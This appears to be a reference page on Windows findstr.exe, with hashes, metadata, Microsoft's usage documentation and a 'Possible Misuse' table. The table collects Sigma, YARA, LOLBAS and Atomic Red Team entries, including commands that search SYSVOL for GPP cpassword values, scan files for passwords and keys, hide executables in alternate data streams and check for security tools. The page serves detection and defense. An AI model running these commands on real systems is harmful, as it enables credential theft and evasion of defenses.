﻿---
title: findstr.exe | Find String (QGREP) Utility
excerpt: What is findstr.exe?
---

# findstr.exe 

* File Path: `C:\windows\system32\findstr.exe`
* Description: Find String (QGREP) Utility

## Hashes

Type | Hash
-- | --
MD5 | `53AD2AF1647B25B2C0CDFE71E082C04D`
SHA1 | `6DF826319EC89669921AF534371817CA6751C3A5`
SHA256 | `95D90AECCB3439AE2460468D249B3034F55074564EE48647B07C283037ACEA53`
SHA384 | `66FE084F754375B80820E969ADF4B0F3C98A842AF3D4F94BCE294BD364C34AE4775B95057ADF86D300BFBA7152925874`
SHA512 | `11C9FA0C004B1BFA25BDE51DCD58351328B0968FDE1CDD2ADBF00CBF9E68E83E62754B7BB8A8F5844F1AD2031F9B67AD08D368D9DA5D2CE67961076075FF85DE`
SSDEEP | `768:UI0kFUnTPAf0fTLUrG7KT/4HFkCYai6lgY6jHYIF8ld2Wtjk/:QkFuTDcS2T/4HFJYfs6SlYWtjk`

## Signature

* Status: The file C:\windows\system32\findstr.exe is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: FINDSTR.EXE.MUI
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 6.3.9600.16384 (winblue_rtm.130821-1623)
* Product Version: 6.3.9600.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `findstr.exe` being misused. While `findstr.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_findstr_lnk.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml) | `title: Findstr Launching .lnk File` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_findstr_lnk.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml) | `description: Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_findstr_lnk.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_findstr_lnk.yml) | `Image: '*\findstr.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `- '\findstr.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `Name: Findstr.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `- Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `- Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `- Command: findstr /S /I cpassword \\sysvol\policies\*.xml` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `- Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `- Path: C:\Windows\System32\findstr.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Findstr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml) | `- Path: C:\Windows\SysWOW64\findstr.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #3: Extracting passwords with findstr [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: GPP Passwords (findstr) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #3: Extracting passwords with findstr [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: GPP Passwords (findstr) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md) | reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType \| findstr LanmanNT  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md) | reg query HKLM\system\currentcontrolset\services /s \| findstr ImagePath 2>nul \| findstr /Ri ".*\.sys$" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | $localip = ((ipconfig \| findstr [0-9].\.)[0]).Split()[-1] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^\| findstr "Active Disc"') do @echo %i \| find /v "#" \| find /v "console" \|\| echo %j > computers.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^\| findstr "Active Disc"') do @echo %i \| find /v "#" \| find /v "console" \|\| echo %j > usernames.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1119.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md) | dir c: /b /s .docx \| findstr /e .docx | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1490.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md) | if(!(vssadmin.exe list shadows \| findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i virus | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i cb | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i defender | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | tasklist.exe \| findstr /i cylance | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1518.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md) | fltmc.exe \| findstr.exe 385201 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md) | - [Atomic Test #3 - Extracting passwords with findstr](#atomic-test-3---extracting-passwords-with-findstr) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md) | ## Atomic Test #3 - Extracting passwords with findstr | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md) | findstr /si pass *.xml *.doc *.txt *.xls | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md) | dir c:\ /b /s .key \| findstr /e .key | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md) | - [Atomic Test #1 - GPP Passwords (findstr)](#atomic-test-1---gpp-passwords-findstr) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md) | ## Atomic Test #1 - GPP Passwords (findstr) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1552.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.006/T1552.006.md) | findstr /S cpassword %logonserver%\sysvol\*.xml | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if ((cmd.exe /c "where.exe Sysmon.exe 2> nul \| findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if(sc.exe query sysmon \| findstr sysmon) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if(cmd.exe /c "where.exe Sysmon.exe 2> nul \| findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if(fltmc.exe filters \| findstr #{sysmon_driver}) { exit 0 } else { exit 1 }  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp_apr17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar) | $x1 = "@@for /f \"delims=\" %%i in ('findstr /smc:\"%s\" *.msg') do if not \"%%MsgFile1%%\"==\"%%i\" del /f \"%%i\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_lazarus_dec17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_dec17.yar) | $x8 = "whoami /groups \| findstr /c:\"S-1-5-32-544\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_susp_lnk_files.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar) | $command = "C:\\Windows\\System32\\cmd.exe" fullword ascii //cmd is precursor to findstr | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_susp_lnk_files.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar) | $command2 =  {2F 00 63 00 20 00 66 00 69 00 6E 00 64 00 73 00 74 00 72} //findstr in hex | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## findstr

Searches for patterns of text in files.

### Syntax

```
findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:<file>] [/c:<string>] [/g:<file>] [/d:<dirlist>] [/a:<colorattribute>] [/off[line]] <strings> [<drive>:][<path>]<filename>[ ...]
```

#### Parameters

| Parameter | Description |
| --------- | ----------- |
| /b | Matches the text pattern if it is at the beginning of a line. |
| /e | Matches the text pattern if it is at the end of a line. |
| /l | Processes search strings literally. |
| /r | Processes search strings as regular expressions. This is the default setting. |
| /s | Searches the current directory and all subdirectories. |
| /i | Ignores the case of the characters when searching for the string. |
| /x | Prints lines that match exactly. |
| /v | Prints only lines that don't contain a match. |
| /n | Prints the line number of each line that matches. |
| /m | Prints only the file name if a file contains a match. |
| /o | Prints character offset before each matching line. |
| /p | Skips files with non-printable characters. |
| /off[line] | Does not skip files that have the offline attribute set. |
| /f:`<file>` | Gets a file list from the specified file. |
| /c:`<string>` | Uses the specified text as a literal search string. |
| /g:`<file>` | Gets search strings from the specified file. |
| /d:`<dirlist>` | Searches the specified list of directories. Each directory must be separated with a semicolon (;), for example `dir1;dir2;dir3`. |
| /a:`<colorattribute>` | Specifies color attributes with two hexadecimal digits. Type `color /?` for additional information. |
| `<strings>` | Specifies the text to search for in *filename*. Required. |
| `[\<drive>:][<path>]<filename>[...]` | Specifies the location and file or files to search. At least one file name is required. |
| /? | Displays Help at the command prompt. |

##### Remarks

- All **findstr** command-line options must precede *strings* and *filename* in the command string.

- Regular expressions use both literal characters and meta-characters to find patterns of text, rather than exact strings of characters.

  - A literal character is a character that doesn't have a special meaning in the regular-expression syntax; instead, it matches an occurrence of that character. For example, letters and numbers are literal characters.

  - A meta-character is a symbol with special meaning (an operator or delimiter) in the regular-expression syntax.

    The accepted meta-characters are:

    | Meta-character | Value |
    | -------------- | ----- |
    | `.`            | **Wildcard** - Any character |
    | `*`            | **Repeat** - Zero or more occurrences of the previous character or class. |
    | `^`            | **Beginning line position** - Beginning of the line. |
    | `$`            | **Ending line position** - End of the line. |
    | `[class]`      | **Character class** - Any one character in a set. |
    | `[^class]`     | **Inverse class** - Any one character not in a set. |
    | `[x-y]`        | **Range** - Any characters within the specified range. |
    | `\x`           | **Escape** - Literal use of a meta-character. |
    | `\<string`     | **Beginning word position** - Beginning of the word. |
    | `string\>`     | **Ending word position** - End of the word. |

    The special characters in regular expression syntax have the most power when you use them together. For example, use the combination of the wildcard character (`.`) and repeat (`*`) character to match any string of characters: `.*`

    Use the following expression as part of a larger expression to match any string beginning with *b* and ending with *ing*: `b.*ing`

- To search for multiple strings in a set of files, you must create a text file that contains each search criterion on a separate line.

- Use spaces to separate multiple search strings unless the argument is prefixed with **/c**.

#### Examples

To search for *hello* or *there* in file *x.y*, type:

```
findstr hello there x.y
```

To search for *hello there* in file *x.y*, type:

```
findstr /c:hello there x.y
```

To find all occurrences of the word *Windows* (with an initial capital letter W) in the file *proposal.txt*, type:

```
findstr Windows proposal.txt
```

To search every file in the current directory and all subdirectories that contained the word *Windows*, regardless of the letter case, type:

```
findstr /s /i Windows *.*
```

To find all occurrences of lines that begin with *FOR* and are preceded by zero or more spaces (as in a computer program loop), and to display the line number where each occurrence is found, type:

```
findstr /b /n /r /c:^ *FOR *.bas
```

To list the exact files that you want to search in a text file, use the search criteria in the file *stringlist.txt*, to search the files listed in *filelist.txt*, and then to store the results in the file *results.out*, type:

```
findstr /g:stringlist.txt /f:filelist.txt > results.out
```

To list every file containing the word *computer* within the current directory and all subdirectories, regardless of case, type:

```
findstr /s /i /m \<computer\> *.*
```

To list every file containing the word computer and any other words that begin with comp, (such as compliment and compete), type:

```
findstr /s /i /m \<comp.* *.*
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020 Strontic.

